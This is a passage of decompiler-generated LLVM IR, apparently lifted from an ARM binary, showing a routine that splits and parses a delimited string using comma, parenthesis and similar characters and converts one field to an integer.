  %v5_9be4 = icmp slt i32 %v4_9be4, 0
  store i1 %v5_9be4, i1* %cpsr_v.global-to-local, align 1
  %v6_9be4 = icmp slt i32 %v1_9be4, 0
  store i1 %v6_9be4, i1* %cpsr_n.global-to-local, align 1
  %v7_9be4 = icmp eq i32 %v1_9be4, 0
  store i1 %v7_9be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9be4, label %.thread46, label %bb212

bb212:                                            ; preds = %.thread45
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9bec = load i32, i32* @r8, align 4
  %v3_9bec = add i32 %v2_9bec, -4
  %v4_9bec = inttoptr i32 %v3_9bec to i32*
  store i32 1, i32* %v4_9bec, align 4
  br label %.thread46

.thread46:                                        ; preds = %.thread45, %bb212
  %v0_9bf0 = load i32, i32* @r5, align 4
  store i32 %v0_9bf0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_9bf8 = load i32, i32* @r8, align 4
  %v2_9bf8 = inttoptr i32 %v1_9bf8 to i32*
  store i32 %v0_9bf0, i32* %v2_9bf8, align 4
  %v2_9bfc = inttoptr i32 %v0_9bf0 to i32*
  %v3_9bfc = call i32 @function_13c04(i32 44, i32* %v2_9bfc)
  %v0_9c00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c00, i32* @r1, align 4
  store i32 %v3_9bfc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c0c = call i32 @function_14960(i8* %tmp199, i32 %v0_9c00, i32 %v3_9bfc)
  store i32 %v4_9c0c, i32* %r0.global-to-local, align 4
  %v1_9c10 = add i32 %v4_9c0c, 1
  %v2_9c10 = icmp eq i32 %v4_9c0c, -1
  store i1 %v2_9c10, i1* %cpsr_c.global-to-local, align 1
  %v3_9c10 = sub i32 0, %v4_9c0c
  %v4_9c10 = and i32 %v1_9c10, %v3_9c10
  %v5_9c10 = icmp slt i32 %v4_9c10, 0
  store i1 %v5_9c10, i1* %cpsr_v.global-to-local, align 1
  %v6_9c10 = icmp slt i32 %v1_9c10, 0
  store i1 %v6_9c10, i1* %cpsr_n.global-to-local, align 1
  %v7_9c10 = icmp eq i32 %v1_9c10, 0
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c10, label %.thread47, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %.thread46
  %v0_9c18 = load i32, i32* @r5, align 4
  store i32 %v0_9c18, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_9c20 = inttoptr i32 %v0_9c18 to i32*
  %v3_9c20 = call i32 @function_13c04(i32 44, i32* %v2_9c20)
  %v0_9c24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c24, i32* @r1, align 4
  store i32 %v3_9c20, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c30 = call i32 @function_14960(i8* %tmp199, i32 %v0_9c24, i32 %v3_9c20)
  store i32 %v4_9c30, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9c3c = add i32 %v4_9c30, %v2_94a0
  store i32 %v2_9c3c, i32* %r3.global-to-local, align 4
  %v1_9c40 = load i32, i32* @r6, align 4
  %v2_9c40 = add i32 %v1_9c40, %v2_9c3c
  %v3_9c40 = inttoptr i32 %v2_9c40 to i8*
  %v4_9c40 = load i8, i8* %v3_9c40, align 1
  %v2_9c48 = icmp ugt i8 %v4_9c40, 31
  store i1 %v2_9c48, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9c48 = icmp ult i8 %v4_9c40, 32
  store i1 %v6_9c48, i1* %cpsr_n.global-to-local, align 1
  %v7_9c48 = icmp eq i8 %v4_9c40, 32
  store i1 %v7_9c48, i1* %cpsr_z.global-to-local, align 1
  %v2_9c50 = zext i1 %v7_9c48 to i32
  %v2_9c50.v4_9c30 = add i32 %v2_9c50, %v4_9c30
  store i32 %v2_9c50.v4_9c30, i32* @r4, align 4
  %v2_9c54 = add i32 %v2_9c50.v4_9c30, %v2_8fd8
  store i32 %v2_9c54, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9c54, i32* %r0.global-to-local, align 4
  %v1_9c60 = load i32, i32* %fp.global-to-local, align 4
  %v2_9c60 = sub i32 %v1_9c60, %v2_9c50.v4_9c30
  store i32 %v2_9c60, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9c68 = call i32 @function_146d0(i32 %v2_9c54, i32 %v2_9c60, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  store i32 %v5_9c68, i32* %r0.global-to-local, align 4
  %v1_9c6c = add i32 %v5_9c68, 1
  %v2_9c6c = icmp eq i32 %v5_9c68, -1
  store i1 %v2_9c6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9c6c = sub i32 0, %v5_9c68
  %v4_9c6c = and i32 %v1_9c6c, %v3_9c6c
  %v5_9c6c = icmp slt i32 %v4_9c6c, 0
  store i1 %v5_9c6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9c6c = icmp slt i32 %v1_9c6c, 0
  store i1 %v6_9c6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9c6c = icmp eq i32 %v1_9c6c, 0
  store i1 %v7_9c6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9c68, i32* %r2.global-to-local, align 4
  br i1 %v7_9c6c, label %.thread47, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c18
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9c80 = load i32, i32* @r4, align 4
  %v2_9c80 = add i32 %v1_9c80, %v2_94a0
  %v1_9c84 = add i32 %v5_9c68, -1
  %v2_9c84 = icmp ne i32 %v5_9c68, 0
  store i1 %v2_9c84, i1* %cpsr_c.global-to-local, align 1
  %v3_9c84 = sub i32 0, %v5_9c68
  %v4_9c84 = and i32 %v5_9c68, %v3_9c84
  %v5_9c84 = icmp slt i32 %v4_9c84, 0
  store i1 %v5_9c84, i1* %cpsr_v.global-to-local, align 1
  %v6_9c84 = icmp slt i32 %v1_9c84, 0
  store i1 %v6_9c84, i1* %cpsr_n.global-to-local, align 1
  %v7_9c84 = icmp eq i32 %v5_9c68, 1
  store i1 %v7_9c84, i1* %cpsr_z.global-to-local, align 1
  %v1_9c88 = add i32 %v2_9c80, -20736
  store i32 %v1_9c88, i32* %r3.global-to-local, align 4
  %v7_9c8c = icmp sgt i32 %v5_9c68, 1
  br i1 %v7_9c8c, label %bb213, label %bb214

bb213:                                            ; preds = %dec_label_pc_9c78
  %v9_9c8c = add i32 %v5_9c68, -2
  store i32 %v9_9c8c, i32* %r2.global-to-local, align 4
  br label %bb214

bb214:                                            ; preds = %dec_label_pc_9c78, %bb213
  %v3_9c94 = phi i32 [ %v5_9c68, %dec_label_pc_9c78 ], [ %v9_9c8c, %bb213 ]
  %v1_9c90 = add i32 %v2_9c80, -20773
  store i32 %v1_9c90, i32* %r3.global-to-local, align 4
  %v0_9c94 = load i32, i32* @r5, align 4
  %v1_9c94 = trunc i32 %v0_9c94 to i8
  %v4_9c94 = add i32 %v3_9c94, %v1_9c90
  %v5_9c94 = inttoptr i32 %v4_9c94 to i8*
  store i8 %v1_9c94, i8* %v5_9c94, align 1
  %v0_9c98 = load i32, i32* @r6, align 4
  store i32 %v0_9c98, i32* %r0.global-to-local, align 4
  %v1_9c9c = inttoptr i32 %v0_9c98 to i8*
  %v2_9c9c = call i32 @function_1460c(i8* %v1_9c9c)
  %v0_9ca0 = load i32, i32* @r5, align 4
  store i32 %v0_9ca0, i32* %r1.global-to-local, align 4
  store i32 %v2_9c9c, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_9cac = inttoptr i32 %v0_9ca0 to i32*
  %v3_9cac = call i32 @function_13c04(i32 43, i32* %v2_9cac)
  %v0_9cb0 = load i32, i32* @r4, align 4
  store i32 %v0_9cb0, i32* @r1, align 4
  store i32 %v3_9cac, i32* %r2.global-to-local, align 4
  %v0_9cb8 = load i32, i32* @r6, align 4
  store i32 %v0_9cb8, i32* %r0.global-to-local, align 4
  %v3_9cbc = inttoptr i32 %v0_9cb8 to i8*
  %v4_9cbc = call i32 @function_14960(i8* %v3_9cbc, i32 %v0_9cb0, i32 %v3_9cac)
  store i32 %v4_9cbc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9cc0 = icmp slt i32 %v4_9cbc, 0
  store i1 %v1_9cc0, i1* %cpsr_n.global-to-local, align 1
  %v2_9cc0 = icmp eq i32 %v4_9cbc, 0
  store i1 %v2_9cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9cc0, label %.thread47, label %bb215

bb215:                                            ; preds = %bb214
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9cc8 = load i32, i32* @r8, align 4
  %v3_9cc8 = inttoptr i32 %v2_9cc8 to i32*
  store i32 1, i32* %v3_9cc8, align 4
  br label %.thread47

.thread47:                                        ; preds = %bb214, %dec_label_pc_9c18, %.thread46, %bb215
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9cd8 = load i32, i32* @r8, align 4
  %v2_9cd8 = add i32 %v1_9cd8, 4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i32*
  store i32 0, i32* %v3_9cd8, align 4
  %v3_9cdc = call i32 @function_13c04(i32 41, i32* null)
  %v0_9ce0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ce0, i32* @r1, align 4
  store i32 %v3_9cdc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9cec = call i32 @function_14960(i8* %tmp199, i32 %v0_9ce0, i32 %v3_9cdc)
  store i32 %v4_9cec, i32* %r0.global-to-local, align 4
  %v1_9cf4 = add i32 %v4_9cec, 1
  %v2_9cf4 = icmp eq i32 %v4_9cec, -1
  store i1 %v2_9cf4, i1* %cpsr_c.global-to-local, align 1
  %v3_9cf4 = sub i32 0, %v4_9cec
  %v4_9cf4 = and i32 %v1_9cf4, %v3_9cf4
  %v5_9cf4 = icmp slt i32 %v4_9cf4, 0
  store i1 %v5_9cf4, i1* %cpsr_v.global-to-local, align 1
  %v6_9cf4 = icmp slt i32 %v1_9cf4, 0
  store i1 %v6_9cf4, i1* %cpsr_n.global-to-local, align 1
  %v7_9cf4 = icmp eq i32 %v1_9cf4, 0
  store i1 %v7_9cf4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9cf4, label %.thread48, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %.thread47
  %v0_9d00 = load i32, i32* @r6, align 4
  store i32 %v0_9d00, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_9d08 = inttoptr i32 %v0_9d00 to i32*
  %v3_9d08 = call i32 @function_13c04(i32 41, i32* %v2_9d08)
  %v0_9d0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9d0c, i32* @r1, align 4
  store i32 %v3_9d08, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9d18 = call i32 @function_14960(i8* %tmp199, i32 %v0_9d0c, i32 %v3_9d08)
  store i32 %v4_9d18, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9d24 = add i32 %v4_9d18, %v2_94a0
  store i32 %v2_9d24, i32* %r3.global-to-local, align 4
  %v1_9d28 = load i32, i32* @r5, align 4
  %v2_9d28 = add i32 %v1_9d28, %v2_9d24
  %v3_9d28 = inttoptr i32 %v2_9d28 to i8*
  %v4_9d28 = load i8, i8* %v3_9d28, align 1
  %v2_9d30 = icmp ugt i8 %v4_9d28, 31
  store i1 %v2_9d30, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9d30 = icmp ult i8 %v4_9d28, 32
  store i1 %v6_9d30, i1* %cpsr_n.global-to-local, align 1
  %v7_9d30 = icmp eq i8 %v4_9d28, 32
  store i1 %v7_9d30, i1* %cpsr_z.global-to-local, align 1
  %v2_9d38 = zext i1 %v7_9d30 to i32
  %v2_9d38.v4_9d18 = add i32 %v2_9d38, %v4_9d18
  store i32 %v2_9d38.v4_9d18, i32* @r4, align 4
  %v2_9d3c = add i32 %v2_9d38.v4_9d18, %v2_8fd8
  store i32 %v2_9d3c, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9d3c, i32* %r0.global-to-local, align 4
  %v1_9d48 = load i32, i32* %fp.global-to-local, align 4
  %v2_9d48 = sub i32 %v1_9d48, %v2_9d38.v4_9d18
  store i32 %v2_9d48, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9d50 = call i32 @function_146d0(i32 %v2_9d3c, i32 %v2_9d48, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  store i32 %v5_9d50, i32* %r0.global-to-local, align 4
  %v1_9d54 = add i32 %v5_9d50, 1
  %v2_9d54 = icmp eq i32 %v5_9d50, -1
  store i1 %v2_9d54, i1* %cpsr_c.global-to-local, align 1
  %v3_9d54 = sub i32 0, %v5_9d50
  %v4_9d54 = and i32 %v1_9d54, %v3_9d54
  %v5_9d54 = icmp slt i32 %v4_9d54, 0
  store i1 %v5_9d54, i1* %cpsr_v.global-to-local, align 1
  %v6_9d54 = icmp slt i32 %v1_9d54, 0
  store i1 %v6_9d54, i1* %cpsr_n.global-to-local, align 1
  %v7_9d54 = icmp eq i32 %v1_9d54, 0
  store i1 %v7_9d54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9d50, i32* %r2.global-to-local, align 4
  br i1 %v7_9d54, label %.thread48, label %dec_label_pc_9d60

dec_label_pc_9d60:                                ; preds = %dec_label_pc_9d00
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9d68 = load i32, i32* @r4, align 4
  %v2_9d68 = add i32 %v1_9d68, %v2_94a0
  %v1_9d6c = add i32 %v5_9d50, -1
  %v2_9d6c = icmp ne i32 %v5_9d50, 0
  store i1 %v2_9d6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9d6c = sub i32 0, %v5_9d50
  %v4_9d6c = and i32 %v5_9d50, %v3_9d6c
  %v5_9d6c = icmp slt i32 %v4_9d6c, 0
  store i1 %v5_9d6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9d6c = icmp slt i32 %v1_9d6c, 0
  store i1 %v6_9d6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9d6c = icmp eq i32 %v5_9d50, 1
  store i1 %v7_9d6c, i1* %cpsr_z.global-to-local, align 1
  %v1_9d70 = add i32 %v2_9d68, -20736
  store i32 %v1_9d70, i32* %r3.global-to-local, align 4
  %v7_9d74 = icmp sgt i32 %v5_9d50, 1
  br i1 %v7_9d74, label %bb216, label %bb217

bb216:                                            ; preds = %dec_label_pc_9d60
  %v9_9d74 = add i32 %v5_9d50, -2
  store i32 %v9_9d74, i32* %r2.global-to-local, align 4
  br label %bb217

bb217:                                            ; preds = %dec_label_pc_9d60, %bb216
  %v3_9d7c = phi i32 [ %v5_9d50, %dec_label_pc_9d60 ], [ %v9_9d74, %bb216 ]
  %v1_9d78 = add i32 %v2_9d68, -20773
  store i32 %v1_9d78, i32* %r3.global-to-local, align 4
  %v0_9d7c = load i32, i32* @r6, align 4
  %v1_9d7c = trunc i32 %v0_9d7c to i8
  %v4_9d7c = add i32 %v3_9d7c, %v1_9d78
  %v5_9d7c = inttoptr i32 %v4_9d7c to i8*
  store i8 %v1_9d7c, i8* %v5_9d7c, align 1
  %v0_9d80 = load i32, i32* @r5, align 4
  store i32 %v0_9d80, i32* %r0.global-to-local, align 4
  %v1_9d84 = inttoptr i32 %v0_9d80 to i8*
  %v2_9d84 = call i32 @function_1460c(i8* %v1_9d84)
  %v0_9d88 = load i32, i32* @r6, align 4
  store i32 %v0_9d88, i32* %r1.global-to-local, align 4
  store i32 %v2_9d84, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_9d94 = inttoptr i32 %v0_9d88 to i32*
  %v3_9d94 = call i32 @function_13c04(i32 42, i32* %v2_9d94)
  %v0_9d98 = load i32, i32* @r4, align 4
  store i32 %v0_9d98, i32* @r1, align 4
  store i32 %v3_9d94, i32* %r2.global-to-local, align 4
  %v0_9da0 = load i32, i32* @r5, align 4
  store i32 %v0_9da0, i32* %r0.global-to-local, align 4
  %v3_9da4 = inttoptr i32 %v0_9da0 to i8*
  %v4_9da4 = call i32 @function_14960(i8* %v3_9da4, i32 %v0_9d98, i32 %v3_9d94)
  store i32 %v4_9da4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9da8 = icmp slt i32 %v4_9da4, 0
  store i1 %v1_9da8, i1* %cpsr_n.global-to-local, align 1
  %v2_9da8 = icmp eq i32 %v4_9da4, 0
  store i1 %v2_9da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9da8, label %.thread48, label %bb218

bb218:                                            ; preds = %bb217
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9db0 = load i32, i32* @r8, align 4
  %v3_9db0 = add i32 %v2_9db0, 4
  %v4_9db0 = inttoptr i32 %v3_9db0 to i32*
  store i32 1, i32* %v4_9db0, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb217, %dec_label_pc_9d00, %.thread47, %bb218
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9dbc = call i32 @function_13c04(i32 40, i32* null)
  %v0_9dc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9dc0, i32* @r1, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9dcc = call i32 @function_14960(i8* %tmp199, i32 %v0_9dc0, i32 %v3_9dbc)
  store i32 %v4_9dcc, i32* %r0.global-to-local, align 4
  %v1_9dd0 = add i32 %v4_9dcc, 1
  %v2_9dd0 = icmp eq i32 %v4_9dcc, -1
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v3_9dd0 = sub i32 0, %v4_9dcc
  %v4_9dd0 = and i32 %v1_9dd0, %v3_9dd0
  %v5_9dd0 = icmp slt i32 %v4_9dd0, 0
  store i1 %v5_9dd0, i1* %cpsr_v.global-to-local, align 1
  %v6_9dd0 = icmp slt i32 %v1_9dd0, 0
  store i1 %v6_9dd0, i1* %cpsr_n.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v1_9dd0, 0
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9dd0, label %.thread, label %dec_label_pc_9de8

.thread:                                          ; preds = %.thread48
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r8, align 4
  %v3_9de0 = add i32 %v2_9de0, 8
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 0, i32* %v4_9de0, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9de8:                                ; preds = %.thread48
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9df0 = call i32 @function_13c04(i32 40, i32* null)
  %v0_9df4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9df4, i32* @r1, align 4
  store i32 %v3_9df0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9e00 = call i32 @function_14960(i8* %tmp199, i32 %v0_9df4, i32 %v3_9df0)
  store i32 %v4_9e00, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9e0c = add i32 %v4_9e00, %v2_94a0
  store i32 %v2_9e0c, i32* %r3.global-to-local, align 4
  %v1_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v1_9e10, %v2_9e0c
  %v3_9e10 = inttoptr i32 %v2_9e10 to i8*
  %v4_9e10 = load i8, i8* %v3_9e10, align 1
  %v2_9e18 = icmp ugt i8 %v4_9e10, 31
  store i1 %v2_9e18, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9e18 = icmp ult i8 %v4_9e10, 32
  store i1 %v6_9e18, i1* %cpsr_n.global-to-local, align 1
  %v7_9e18 = icmp eq i8 %v4_9e10, 32
  store i1 %v7_9e18, i1* %cpsr_z.global-to-local, align 1
  %v2_9e20 = zext i1 %v7_9e18 to i32
  %v2_9e20.v4_9e00 = add i32 %v2_9e20, %v4_9e00
  store i32 %v2_9e20.v4_9e00, i32* @r4, align 4
  %v2_9e24 = add i32 %v2_9e20.v4_9e00, %v2_8fd8
  store i32 %v2_9e24, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9e24, i32* %r0.global-to-local, align 4
  %v1_9e30 = load i32, i32* %fp.global-to-local, align 4
  %v2_9e30 = sub i32 %v1_9e30, %v2_9e20.v4_9e00
  store i32 %v2_9e30, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9e38 = call i32 @function_146d0(i32 %v2_9e24, i32 %v2_9e30, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  store i32 %v5_9e38, i32* %r0.global-to-local, align 4
  %v1_9e3c = add i32 %v5_9e38, 1
  %v2_9e3c = icmp eq i32 %v5_9e38, -1
  store i1 %v2_9e3c, i1* %cpsr_c.global-to-local, align 1
  %v3_9e3c = sub i32 0, %v5_9e38
  %v4_9e3c = and i32 %v1_9e3c, %v3_9e3c
  %v5_9e3c = icmp slt i32 %v4_9e3c, 0
  store i1 %v5_9e3c, i1* %cpsr_v.global-to-local, align 1
  %v6_9e3c = icmp slt i32 %v1_9e3c, 0
  store i1 %v6_9e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_9e3c = icmp eq i32 %v1_9e3c, 0
  store i1 %v7_9e3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9e38, i32* %r2.global-to-local, align 4
  br i1 %v7_9e3c, label %dec_label_pc_9e7c, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9de8
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, %v2_94a0
  %v1_9e54 = add i32 %v5_9e38, -1
  %v2_9e54 = icmp ne i32 %v5_9e38, 0
  store i1 %v2_9e54, i1* %cpsr_c.global-to-local, align 1
  %v3_9e54 = sub i32 0, %v5_9e38
  %v4_9e54 = and i32 %v5_9e38, %v3_9e54
  %v5_9e54 = icmp slt i32 %v4_9e54, 0
  store i1 %v5_9e54, i1* %cpsr_v.global-to-local, align 1
  %v6_9e54 = icmp slt i32 %v1_9e54, 0
  store i1 %v6_9e54, i1* %cpsr_n.global-to-local, align 1
  %v7_9e54 = icmp eq i32 %v5_9e38, 1
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v2_9e50, -20736
  store i32 %v1_9e58, i32* %r3.global-to-local, align 4
  %v7_9e5c = icmp sgt i32 %v5_9e38, 1
  br i1 %v7_9e5c, label %bb219, label %bb220

bb219:                                            ; preds = %dec_label_pc_9e48
  %v9_9e5c = add i32 %v5_9e38, -2
  store i32 %v9_9e5c, i32* %r2.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_9e48, %bb219
  %v3_9e70 = phi i32 [ %v5_9e38, %dec_label_pc_9e48 ], [ %v9_9e5c, %bb219 ]
  %v1_9e60 = add i32 %v2_9e50, -20773
  store i32 %v1_9e60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_9e68 = load i32, i32* @r5, align 4
  store i32 %v0_9e68, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9e70 = add i32 %v3_9e70, %v1_9e60
  %v5_9e70 = inttoptr i32 %v4_9e70 to i8*
  store i8 0, i8* %v5_9e70, align 1
  %v2_9e74 = inttoptr i32 %v0_9e68 to i8*
  %v3_9e74 = call i32 @function_14738(i8* %v2_9e74, i32 10)
  store i32 %v3_9e74, i32* %r0.global-to-local, align 4
  %v1_9e78 = load i32, i32* @r8, align 4
  %v2_9e78 = add i32 %v1_9e78, 8
  %v3_9e78 = inttoptr i32 %v2_9e78 to i32*
  store i32 %v3_9e74, i32* %v3_9e78, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9e7c:                                ; preds = %.thread, %dec_label_pc_9de8, %bb220
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_a054, %dec_label_pc_9fd4, %dec_label_pc_9e7c
  %v1_9e8c = phi i32 [ 0, %dec_label_pc_9e7c ], [ %v0_9fd4, %dec_label_pc_9fd4 ], [ %v1_9e8c.pre.pre, %dec_label_pc_a054 ]
  store i32 %v2_8fd8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9e8c = add i32 %v1_9e8c, %v2_8fd8
  store i32 %v2_9e8c, i32* @r4, align 4
  %v3_9e90 = call i32 @function_13c04(i32 39, i32* null)
  %v0_9e94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e94, i32* @r1, align 4
  store i32 %v3_9e90, i32* %r2.global-to-local, align 4
  %v0_9e9c = load i32, i32* @r4, align 4
  store i32 %v0_9e9c, i32* %r0.global-to-local, align 4
  %v3_9ea0 = inttoptr i32 %v0_9e9c to i8*
  %v4_9ea0 = call i32 @function_14960(i8* %v3_9ea0, i32 %v0_9e94, i32 %v3_9e90)
  store i32 %v4_9ea0, i32* %r0.global-to-local, align 4
  %v1_9ea8 = add i32 %v4_9ea0, 1
  %v2_9ea8 = icmp eq i32 %v4_9ea0, -1
  store i1 %v2_9ea8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ea8 = sub i32 0, %v4_9ea0
  %v4_9ea8 = and i32 %v1_9ea8, %v3_9ea8
  %v5_9ea8 = icmp slt i32 %v4_9ea8, 0
  store i1 %v5_9ea8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ea8 = icmp slt i32 %v1_9ea8, 0
  store i1 %v6_9ea8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ea8 = icmp eq i32 %v1_9ea8, 0
  store i1 %v7_9ea8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9ea8, label %dec_label_pc_a080, label %dec_label_pc_9eb4

dec_label_pc_9eb4:                                ; preds = %dec_label_pc_9e80
  %v0_9eb4 = load i32, i32* @r8, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 12
  %v2_9eb4 = inttoptr i32 %v1_9eb4 to i32*
  %v3_9eb4 = load i32, i32* %v2_9eb4, align 4
  store i32 %v3_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = add i32 %v3_9eb4, -4
  %v2_9eb8 = icmp ugt i32 %v3_9eb4, 3
  store i1 %v2_9eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_9eb8 = sub i32 3, %v3_9eb4
  %v4_9eb8 = and i32 %v3_9eb8, %v3_9eb4
  %v5_9eb8 = icmp slt i32 %v4_9eb8, 0
  store i1 %v5_9eb8, i1* %cpsr_v.global-to-local, align 1
  %v6_9eb8 = icmp slt i32 %v1_9eb8, 0
  store i1 %v6_9eb8, i1* %cpsr_n.global-to-local, align 1
  %v7_9eb8 = icmp eq i32 %v3_9eb4, 4
  store i1 %v7_9eb8, i1* %cpsr_z.global-to-local, align 1
  %v8_9ebc = icmp sgt i32 %v3_9eb4, 4
  br i1 %v8_9ebc, label %dec_label_pc_a080, label %dec_label_pc_9ec0

dec_label_pc_9ec0:                                ; preds = %dec_label_pc_9eb4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_9ec8 = call i32 @function_13c04(i32 39, i32* null)
  %v0_9ecc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ecc, i32* @r1, align 4
  store i32 %v3_9ec8, i32* %r2.global-to-local, align 4
  %v0_9ed4 = load i32, i32* @r4, align 4
  store i32 %v0_9ed4, i32* %r0.global-to-local, align 4
  %v3_9ed8 = inttoptr i32 %v0_9ed4 to i8*
  %v4_9ed8 = call i32 @function_14960(i8* %v3_9ed8, i32 %v0_9ecc, i32 %v3_9ec8)
  store i32 %v4_9ed8, i32* %r0.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r5, align 4
  %v2_9ee0 = add i32 %v0_9ee0, %v4_9ed8
  store i32 %v2_9ee0, i32* @sl, align 4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
